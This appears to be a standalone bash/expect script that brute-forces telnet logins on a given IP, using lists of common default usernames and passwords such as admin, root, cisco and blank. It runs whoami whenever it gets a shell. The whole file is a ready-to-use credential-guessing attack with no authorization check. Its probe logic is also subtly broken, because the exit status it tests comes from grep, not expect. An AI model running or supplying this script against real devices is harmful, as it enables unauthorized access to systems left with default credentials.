#!/bin/bash
# Telnet Default Credentials Testing Script
# Usage: ./telnet_brute.sh <target_ip>

TARGET_IP="$1"

if [[ -z "$TARGET_IP" ]]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

USERS=("admin" "root" "guest" "cisco" "enable")
PASSWORDS=("admin" "password" "" "root" "guest" "cisco" "enable")

# Test the connection to determine if authentication is required
expect <<EOF | grep -q "login:"
set timeout 5
spawn telnet $TARGET_IP
expect {
    "login:" { exit 0 }
    -re {[#\$]} { exit 1 }
    timeout { exit 2 }
}
EOF

auth_required=$?

if [[ "$auth_required" -eq 2 ]]; then
    echo "ERROR: Telnet connection timed out or unexpected prompt"
    exit 1
elif [[ "$auth_required" -eq 1 ]]; then
    echo "Telnet server does NOT require authentication. Proceeding without credentials..."
    expect <<EOF
set timeout 5
spawn telnet $TARGET_IP
expect {
    -re {[#\$]} {
        send "whoami\r"
        send "exit\r"
    }
    timeout {
        puts "No shell prompt received"
    }
}
expect eof
EOF
else
    echo "Telnet server requires login. Brute-forcing credentials..."

    for user in "${USERS[@]}"; do
        for pass in "${PASSWORDS[@]}"; do
            echo "Testing $user:$pass"
            expect <<EOF
set timeout 5
spawn telnet $TARGET_IP
expect "login:"
send "$user\r"
expect "Password:"
send "$pass\r"
expect {
    -re {[#\$]} {
        send "whoami\r"
        send "exit\r"
    }
    timeout {
        # silent failure, likely bad login
    }
}
expect eof
EOF
        done
    done
fi
